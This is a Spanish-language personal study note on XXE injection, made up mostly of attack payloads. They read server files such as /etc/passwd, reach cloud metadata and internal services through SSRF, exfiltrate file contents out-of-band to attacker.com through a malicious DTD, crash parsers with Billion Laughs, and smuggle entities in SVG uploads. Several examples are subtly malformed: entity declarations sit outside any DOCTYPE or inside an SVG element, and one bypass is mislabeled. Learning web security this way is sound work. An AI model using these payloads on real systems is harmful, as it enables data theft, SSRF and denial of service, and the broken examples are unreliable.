---
title: "XXE — XML External Entities"
type: note
status: active
tags:
  - seguridad
  - web
  - xxe
  - vulnerabilidades
aliases:
  - XML External Entity
  - XXE
  - External Entity Injection
created: 2026-06-13
updated: 2026-06-13
---

# XXE — XML External Entities

> [!INFO] Fuente
> PortSwigger XXE, PayloadsAllTheThings.

---

## Que es

XXE ocurre cuando una aplicacion procesa XML y permite la inclusion de entidades externas. Esto puede llevar a:

- Lectura de archivos del servidor
- SSRF a servicios internos
- Denegacion de servicio (Billion Laughs)
- RCE (si hay deserializacion)

---

## Deteccion

Primero, busca endpoints que acepten XML:

```http
POST /api/upload HTTP/1.1
Content-Type: text/xml
# o application/xml, application/soap+xml

<root>
  <user>test</user>
</root>
```

Proba cambiar a XML:

```http
Content-Type: text/xml
Content-Type: application/xml

# Si antes era JSON:
Content-Type: application/json → application/xml
```

---

## Lectura de archivos

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <user>&xxe;</user>
</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>
  <user>&xxe;</user>
</root>
```

---

## SSRF via XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
  <user>&xxe;</user>
</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:9200/">
]>
<root>
  <user>&xxe;</user>
</root>
```

---

## Blind XXE

Cuando no ves la respuesta, usa OOB (Out-of-Band):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/collect">
  %xxe;
]>
<root>
  <user>test</user>
</root>
```

### Blind XXE con exfil

```xml
<!-- Servidor: DTD malicioso en attacker.com/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;

<!-- Payload en la request -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>
  <user>test</user>
</root>
```

---

## Error-based XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
<root/>
```

Si el servidor devuelve errores con la ruta del archivo, se filtra el contenido.

---

## XInclude

Cuando no controlas el XML completo pero podes inyectar dentro de un elemento:

```xml
<root>
  <user xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
  </user>
</root>
```

---

## Billion Laughs (DoS)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ...
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```

La entidad se expande exponencialmente: lol9 = 10^8 "lol". Puede crashear el servidor.

---

## SVG XXE

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <defs>
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
  </defs>
  <text font-size="20" x="10" y="20">&xxe;</text>
</svg>
```

---

## Bypass de protecciones

```xml
# Si las entidades externas estan deshabilitadas, probar:

# Parameter entities + XInclude
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>

# DocType en diferentes lugares
<?xml version="1.0"?>
<!DOCTYPE root [ ... ]>
<root>...</root>
```

---

## Labs

| Recurso | Link |
|---------|------|
| PortSwigger XXE | portswigger.net/web-security/xxe |

---

## Ver tambien

- [[SEGURIDAD/Vulnerabilidades Web]]
- [[SEGURIDAD/SSRF]]
- [[SEGURIDAD/00 - INDICE]]
